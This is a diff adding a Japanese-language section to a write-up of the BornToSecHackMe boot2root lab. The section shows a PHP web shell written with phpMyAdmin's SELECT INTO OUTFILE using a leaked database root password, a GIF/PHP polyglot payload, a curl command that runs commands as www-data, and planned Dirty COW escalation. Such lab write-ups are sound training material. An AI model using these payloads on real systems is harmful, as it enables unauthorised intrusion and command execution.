@@ -81,6 +81,35 @@ Oct  5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\
 *   **DB User:** `root`
 *   **DB Password:** `Fg-'kKXBj87E:aJ$`
 
+## 5. Web Shell の獲得 (Command Injection)
+
+### 掲示板での画像アップロードと制限の突破
+掲示板機能において、画像ファイルのアップロードを試みたが、GIF形式のファイルを含むいくつかの画像が拒否された。これは主にファイルサイズと画像サイズ (`upload_max_img_width`, `upload_max_img_height`) の制限によるものと判明。特にアバター画像のアップロードでは 80x80 ピクセルの制限があった。
+
+この制限を回避するため、有効な GIF ファイルの構造を模倣しつつ、画像コメント部分にPHPコード (`<?php system($_GET["c"]); ?>`) を埋め込んだポリグロット GIF ファイル (`shell_avatar.gif`) を作成した。
+
+### phpMyAdmin を利用したファイル書き込み
+入手済みのデータベース `root` ユーザーの認証情報 (`root`/`Fg-'kKXBj87E:aJ$`) を使用し、`phpMyAdmin` にログイン。`SELECT ... INTO OUTFILE` 機能を利用して、Web Shell ファイルを Web サーバーがアクセス可能なディレクトリに直接書き込んだ。
+
+```sql
+SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/shell.php';
+```
+
+この操作により、`https://100.64.1.32/forum/templates_c/shell.php` に PHP Web Shell が正常に設置された。
+
+### Web Shell の動作確認
+Web Shell にアクセスし、コマンド実行が可能であることを確認した。
+
+```bash
+curl -k "https://100.64.1.32/forum/templates_c/shell.php?c=id"
+```
+
+**実行結果:**
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+この結果により、`www-data` ユーザーの権限で任意のコマンド実行が可能となり、**Web Shell の獲得（コマンドインジェクション成功）** が確認された。
+
 ---
 **次のステップ:**
-入手した `root` アカウントで phpMyAdmin にログインし、他のユーザー（`admin` や `zaz`）のパスワードハッシュを抽出し、システム（SSH）へのログインを目指す。
+`www-data` ユーザーの権限から、さらに上位の特権（`ft_root` や `root` など）を奪取するための情報を収集する。カーネルの既知の脆弱性（Dirty COW など）や、他のユーザーのファイルからパスワードや秘密鍵などを発見することを目指す。
